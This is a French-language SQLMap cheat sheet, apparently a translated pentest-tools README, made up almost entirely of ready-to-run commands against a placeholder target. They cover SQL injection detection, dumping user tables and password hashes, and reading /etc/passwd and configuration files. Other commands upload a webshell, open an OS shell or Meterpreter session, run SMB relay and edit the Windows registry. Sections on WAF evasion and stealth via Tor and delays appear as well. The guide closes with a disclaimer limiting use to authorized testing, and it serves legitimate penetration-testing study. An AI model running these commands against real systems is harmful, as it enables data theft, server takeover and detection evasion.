# 💉 SQLMap — fiche pratique complète

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    Automatic SQL Injection Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="SQL Injection">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Penetration Testing">
</p>

<p align="center">
  <b>🔥 Un outil majeur d’automatisation des tests d’injection SQL</b>
</p>

---

> **Précisions sur les exemples :** `--output-dir` choisit un répertoire, pas le format HTML ; `--dump-format` contrôle le format d’export. L’option documentée du Registre est `--reg-key` : la forme source `-reg-key` est conservée. `--passwords` énumère des empreintes, pas nécessairement des mots de passe en clair. `--identify-waf` est absent de l’aide officielle consultée, contrairement à `--skip-waf`. Voir le [guide officiel SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/Usage).
> **Prérequis :** l’accès aux fichiers, au système ou au Registre dépend du SGBD et des droits. Les scripts tamper, Tor et les délais ne garantissent pas un contournement ou une absence de détection. Les noms de bases et le dessin ASCII restent ceux du document source.

## 📋 Table des matières

- [Introduction](#-introduction)
- [Installation](#-installation)
- [Syntaxe de base](#-syntaxe-de-base)
- [Options de définition des cibles](#-options-de-définition-des-cibles)
- [Options des requêtes](#-options-des-requêtes)
- [Options de détection](#-options-de-détection)
- [Énumération](#-énumération)
- [Extraction de données](#-extraction-de-données)
- [Opérations sur les fichiers](#-opérations-sur-les-fichiers)
- [Accès au système d’exploitation](#-accès-au-système-dexploitation)
- [Techniques de contournement](#-techniques-de-contournement)
- [Scripts de transformation (tamper)](#scripts-tamper-courants)
- [Exemples pratiques](#-exemples-pratiques)
- [Référence rapide](#-référence-rapide)
- [Conseils et bonnes pratiques](#-conseils-et-bonnes-pratiques)
- [Ressources](#-ressources)

---

## 🎯 Introduction

**SQLMap** est un outil libre de test d’intrusion qui automatise la détection et l’exploitation des vulnérabilités d’injection SQL.

### Principales fonctionnalités

| Fonctionnalité | Description |
| --------- | ------------- |
| **Détection automatique** | Détecte automatiquement les vulnérabilités d’injection SQL |
| **Bases prises en charge** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite et d’autres |
| **Prise de contrôle étendue** | Identification du SGBD, extraction de données et accès au système |
| **Techniques de contournement** | Contournement des WAF/IPS à l’aide de scripts de transformation |
| **Plusieurs types d’injection** | Booléenne, par erreur, UNION, requêtes empilées et temporisation |

### Bases de données prises en charge

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

### Types d’injection SQL

| Type | Code | Description |
| ------ | ------ | ------------- |
| Injection aveugle fondée sur une condition booléenne | `B` | Réponses vrai/faux |
| Injection fondée sur les erreurs | `E` | Erreurs du SGBD dans la réponse |
| Injection par requête UNION | `U` | Injection UNION SELECT |
| Requêtes empilées | `S` | Plusieurs requêtes séparées par un point-virgule (;) |
| Injection aveugle fondée sur la temporisation | `T` | Délais dans les temps de réponse |
| Requêtes imbriquées | `Q` | Requêtes intégrées ou imbriquées |

---

## 📥 Installation

### Kali Linux (préinstallé)
```bash
# Mettre SQLMap à jour
sudo apt update && sudo apt install sqlmap
```

### Depuis GitHub (dernière version)
```bash
# Cloner le dépôt
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Lancer SQLMap
cd sqlmap-dev
python sqlmap.py --version
```

### Avec pip
```bash
pip install sqlmap
```

### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

### Vérifier l’installation
```bash
sqlmap --version
sqlmap -h          # Aide de base
sqlmap -hh         # Aide avancée
```

---

<a id="-syntaxe-de-base"></a>
## ⌨️ Syntaxe de base

### Syntaxe générale
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

### Exemples pour démarrer
```bash
# Analyse élémentaire
sqlmap -u "http://target.com/page.php?id=1"

# Analyse avec un cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Analyser une requête POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Analyser depuis un fichier
sqlmap -r request.txt

# Mode automatique
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

## 🎯 Options de définition des cibles

### URL cible (-u)
```bash
# URL de base
sqlmap -u "http://target.com/page.php?id=1"

# Plusieurs paramètres
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# Préciser le paramètre à tester
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# Tester tous les paramètres
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

### Fichier de requête (-r)
```bash
# Enregistrer la requête de Burp Suite dans un fichier
# Puis analyser :
sqlmap -r request.txt

# Exemple de fichier de requête :
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

### Requête Google dork (-g)
```bash
# Rechercher et tester les résultats Google
sqlmap -g "inurl:page.php?id="

# Avec des pages précises
sqlmap -g "inurl:product.php?id= site:target.com"
```

### Connexion directe à une base de données (-d)
```bash
# Se connecter directement à la base de données
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

### Liste de cibles (-m)
```bash
# Fichier contenant plusieurs URL
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

### Fichier de configuration (-c)
```bash
# Utiliser un fichier de configuration
sqlmap -c sqlmap.conf
```

---

## 📡 Options des requêtes

### Méthode HTTP et données
```bash
# Données POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Préciser la méthode
sqlmap -u "http://target.com/api/user/1" --method=PUT

# Données JSON
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Cookies
```bash
# Un seul cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Plusieurs cookies
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# Charger les cookies depuis un fichier
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# Tester un paramètre de cookie
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

### En-têtes
```bash
# En-tête personnalisé
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# Plusieurs en-têtes
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# User-Agent aléatoire
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

### Authentification
```bash
# Authentification Basic
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Authentification Digest
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# Authentification NTLM
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

### Proxy
```bash
# Proxy HTTP
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Proxy SOCKS
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# Vérifier Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

## 🔍 Options de détection

### Niveau et risque
```bash
# Niveau (1-5) — nombre de tests
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Risque (1-3) — danger associé aux tests
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# Proposé dans la source pour des tests approfondis
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| Niveau | Tests |
| ------- | ------- |
| 1 | Par défaut — tests élémentaires |
| 2 | + Test des cookies |
| 3 | + Test des en-têtes User-Agent et Referer |
| 4 | + Davantage de charges utiles (payloads) |
| 5 | + Toutes les charges utiles |

| Risque | Description |
| ------ | ------------- |
| 1 | Par défaut — tests présentés comme peu risqués |
| 2 | + Tests temporels lourds |
| 3 | + Tests fondés sur OR (peuvent modifier les données !) |

### Sélection des techniques
```bash
# Technique précise
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # UNION uniquement
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # Booléenne uniquement
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # Par erreur uniquement
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # Temporelle uniquement
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # Requêtes empilées uniquement

# Plusieurs techniques
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Toutes les techniques (par défaut)
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

### Délais
```bash
# Délai de l’injection temporelle (par défaut : 5)
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# Délai entre les requêtes
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

### Threads
```bash
# Connexions simultanées (par défaut : 1)
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

## 📊 Énumération

### Énumération des bases de données
```bash
# Obtenir la base de données courante
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Obtenir l’utilisateur courant
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Vérifier si l’utilisateur est administrateur du SGBD
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# Lister toutes les bases de données
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Lister tous les utilisateurs
sqlmap -u "http://target.com/page.php?id=1" --users

# Lister les mots de passe des utilisateurs (libellé source)
sqlmap -u "http://target.com/page.php?id=1" --passwords

# Lister les privilèges
sqlmap -u "http://target.com/page.php?id=1" --privileges

# Lister les rôles
sqlmap -u "http://target.com/page.php?id=1" --roles
```

### Énumération des tables
```bash
# Lister les tables d’une base de données
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Lister toutes les tables
sqlmap -u "http://target.com/page.php?id=1" --tables

# Compter les entrées des tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

### Énumération des colonnes
```bash
# Lister les colonnes d’une table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Rechercher des noms de colonnes
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

### Extraction du schéma
```bash
# Extraire le schéma de la base de données
sqlmap -u "http://target.com/page.php?id=1" --schema

# Exclure les bases de données système
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

## 📤 Extraction de données

### Extraire les données
```bash
# Extraire une table précise
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Extraire des colonnes précises
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# Extraire toutes les tables d’une base de données
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# Tout extraire
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Exclure les bases de données système
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### Limiter les résultats
```bash
# Les 10 premières lignes
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# Lignes 5 à 15
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# Clause WHERE
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

### Requêtes SQL personnalisées
```bash
# Exécuter une requête SQL
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# Shell SQL interactif
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

### Formats de sortie
```bash
# Enregistrer au format CSV
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# Enregistrer au format HTML (libellé source ; voir la précision)
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

## 📁 Opérations sur les fichiers

### Lire des fichiers
```bash
# Lire un fichier sur le serveur
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Lire des fichiers Windows
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Lire la configuration web
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

### Écrire des fichiers
```bash
# Écrire un fichier sur le serveur
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# Téléverser un webshell
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

## 💻 Accès au système d’exploitation

### Exécution de commandes
```bash
# Exécuter une commande du système
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Shell interactif
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# PowerShell sous Windows
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

### Session Meterpreter
```bash
# Obtenir une session Meterpreter
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# Avec des options précises
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

### Relais SMB
```bash
# Attaque par relais SMB
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

### Accès au Registre (Windows)
```bash
# Lire le Registre
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# Ajouter une clé de Registre
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# Supprimer une clé de Registre
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

<a id="-techniques-de-contournement"></a>
## 🛡️ Techniques de contournement

### Contournement des WAF/IPS
```bash
# Identifier le WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Ignorer la détection du WAF
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# Casse aléatoire
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# Plusieurs scripts tamper
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

### Scripts tamper courants
```bash
# Encodage d’URL
--tamper=charencode

# Double encodage d’URL
--tamper=chardoubleencode

# Encodage Unicode
--tamper=charunicodeencode

# Remplacer les espaces par des commentaires
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# Modification de la casse
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# Remplacer les mots-clés
--tamper=between
--tamper=equaltolike
```

### Référence des scripts tamper

| Script | Description |
| -------- | ------------- |
| `apostrophemask` | Remplacer l’apostrophe par une forme UTF-8 |
| `apostrophenullencode` | Remplacer l’apostrophe par un double encodage Unicode |
| `base64encode` | Encoder la charge utile en Base64 |
| `between` | Remplacer `>` par `NOT BETWEEN 0 AND #` |
| `charencode` | Encoder tous les caractères dans l’URL |
| `charunicodeencode` | Appliquer un encodage Unicode-URL |
| `concat2concatws` | Remplacer `CONCAT` par `CONCAT_WS` |
| `equaltolike` | Remplacer `=` par `LIKE` |
| `greatest` | Remplacer `>` par `GREATEST` |
| `halfversionedmorekeywords` | Ajouter un commentaire MySQL conditionné par la version |
| `ifnull2ifisnull` | Remplacer `IFNULL` par `IF(ISNULL())` |
| `lowercase` | Mettre les mots-clés en minuscules |
| `modsecurityversioned` | Contourner ModSecurity avec un commentaire conditionné par la version |
| `modsecurityzeroversioned` | Contourner ModSecurity avec un commentaire portant une version nulle |
| `percentage` | Ajouter un signe pour cent devant les caractères |
| `randomcase` | Varier aléatoirement la casse des mots-clés |
| `randomcomments` | Insérer aléatoirement des commentaires dans les mots-clés SQL |
| `securesphere` | Ajouter une chaîne particulière pour contourner SecureSphere |
| `space2comment` | Remplacer les espaces par `/**/` |
| `space2dash` | Remplacer les espaces par le commentaire `--` |
| `space2hash` | Remplacer les espaces par un commentaire `#` |
| `space2morehash` | Remplacer les espaces par `#` et un saut de ligne |
| `space2mssqlblank` | Remplacer les espaces par des caractères blancs MSSQL |
| `space2mssqlhash` | Remplacer les espaces par `#` et un saut de ligne (MSSQL) |
| `space2plus` | Remplacer les espaces par `+` |
| `space2randomblank` | Remplacer les espaces par un caractère blanc aléatoire |
| `symboliclogical` | Remplacer `AND`/`OR` par `&&`/`\|\|` |
| `unionalltounion` | Remplacer `UNION ALL` par `UNION` |
| `unmagicquotes` | Remplacer le guillemet par la séquence multioctet `%bf%27` |
| `uppercase` | Mettre les mots-clés en majuscules |
| `versionedkeywords` | Encadrer les mots-clés par un commentaire conditionné par la version |
| `versionedmorekeywords` | Encadrer davantage de mots-clés par un commentaire conditionné par la version |
| `xforwardedfor` | Ajouter un faux en-tête `X-Forwarded-For` |

---

## 🎬 Exemples pratiques

### Exemple 1 : analyse élémentaire
```bash
# Analyser en mode automatique
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

### Exemple 2 : extraction complète d’une base
```bash
# Énumérer et extraire
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# Après avoir trouvé la base de données
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# Extraire la table des utilisateurs
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

### Exemple 3 : requête POST avec cookie
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

### Exemple 4 : via le proxy Burp
```bash
# Enregistrer la requête de Burp dans un fichier, puis :
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

### Exemple 5 : contournement d’un WAF
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

### Exemple 6 : obtenir un shell système
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

### Exemple 7 : lire des fichiers sensibles
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

## 📊 Référence rapide

### Commandes essentielles

| Commande | Description |
| --------- | ------------- |
| `-u URL` | URL cible avec paramètre |
| `-r FILE` | Charger une requête depuis un fichier |
| `--data=DATA` | Données POST |
| `--cookie=COOKIE` | Cookie HTTP |
| `--dbs` | Lister les bases de données |
| `--tables` | Lister les tables |
| `--columns` | Lister les colonnes |
| `--dump` | Extraire les données |
| `-D DB` | Préciser la base de données |
| `-T TABLE` | Préciser la table |
| `-C COLS` | Préciser les colonnes |
| `--batch` | Mode non interactif |

### Options de détection

| Option | Description |
| -------- | ------------- |
| `--level=LEVEL` | Niveau des tests (1-5) |
| `--risk=RISK` | Niveau de risque (1-3) |
| `-p PARAM` | Paramètre à tester |
| `--technique=TECH` | Technique d’injection |
| `--threads=N` | Threads simultanés |

### Options de sortie

| Option | Description |
| -------- | ------------- |
| `-v LEVEL` | Niveau de détail (0-6) |
| `--batch` | Ne jamais demander de saisie |
| `--flush-session` | Effacer le cache de session |
| `--output-dir=DIR` | Répertoire de sortie personnalisé |

---

## 💡 Conseils et bonnes pratiques

### Conseils de performance

1. **Commencer simplement**
   ```bash
   # Commencer avec un niveau faible
   sqlmap -u "URL" --level=1 --batch
   # Augmenter si nécessaire
   ```

2. **Utiliser --batch pour l’automatisation**
   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **Gagner du temps avec des tests ciblés**
   ```bash
   # Tester uniquement les injections UNION
   sqlmap -u "URL" --technique=U
   ```

### Conseils de discrétion

1. **User-Agent aléatoire**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **Ajouter un délai**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **Utiliser Tor**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

### Résolution des problèmes

| Problème | Solution |
| ------- | ---------- |
| Aucune injection trouvée | Augmenter `--level` et `--risk` |
| Blocage par un WAF | Utiliser des scripts `--tamper` |
| Analyse lente | Réduire `--level` et choisir une `--technique` précise |
| Problèmes de connexion | Vérifier `--timeout` et `--retries` |

---

## ⚠️ Avertissement juridique

> **AVERTISSEMENT :** SQLMap est un outil puissant qui doit être réservé aux **tests autorisés**.
> 
> - ✅ Tester les systèmes dont vous êtes propriétaire
> - ✅ Tester avec une autorisation écrite explicite
> - ✅ Utiliser l’outil dans le cadre de missions légales de test d’intrusion
> - ❌ Ne jamais utiliser l’outil sur des systèmes sans autorisation
> - ❌ Ne jamais l’utiliser à des fins malveillantes
> 
> **L’accès non autorisé aux systèmes informatiques est illégal et passible de sanctions.**

---

## 📚 Ressources

### Ressources officielles
- [Site officiel de SQLMap](https://sqlmap.org/)
- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)

### Ressources d’apprentissage
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

### Fiches connexes
- [Metasploit Framework](../../Metasploit/translations/README.fr.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.fr.md)

---

<p align="center">
  <b>💉 Maîtrisez les tests d’injection SQL !</b><br>
  <i>Un grand pouvoir implique de grandes responsabilités</i>
</p>
